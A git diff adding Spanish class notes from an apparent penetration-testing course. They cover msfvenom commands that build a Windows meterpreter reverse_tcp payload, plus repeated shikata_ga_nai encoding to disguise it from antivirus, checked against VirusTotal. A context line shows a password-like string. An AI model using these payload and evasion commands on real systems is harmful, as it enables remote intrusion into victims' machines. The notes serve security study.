@@ -110,3 +110,28 @@ Bob - !P@$sW0rD!123
 - **Post-Explotación**: WinPEAS, LinPEAS, Gtfobins, Lolbas, Bashark, Mimikatz, Empire, Msfvenom.
 - **Framework General**: Metasploit (msfconsole).
 - **Decodificación Base64**: Método para decodificar y codificar en formato base64.
+
+## Clase del 06-11-2024
+
+Continuacion maquina blue
+
+## Clase del 14-11-2024
+
+Esteganografia online
+
+Explica el: msfvenom-p windows/meterpreter/reverse_tcp LHOST=(Your IP Address) LPORT=(Your Port) -f exe > reverse.exe
+
+show encoders
+
+Para encodear --> msfvenom-p windows/meterpreter/reverse_tcp LHOST=(Your IP Address) LPORT=(Your Port) -f exe -e (el encoder) x86/shikata_gnai -i 80> reverse.exe
+
+-i para encodear lo encodeado, el numero lo disfraza 80 veces
+
+virus total
+
+searchsploit para buscar sin conexion
+
+![image](https://github.com/user-attachments/assets/076a4289-f5ed-45c4-9a74-3ace21938308)
+
+
+
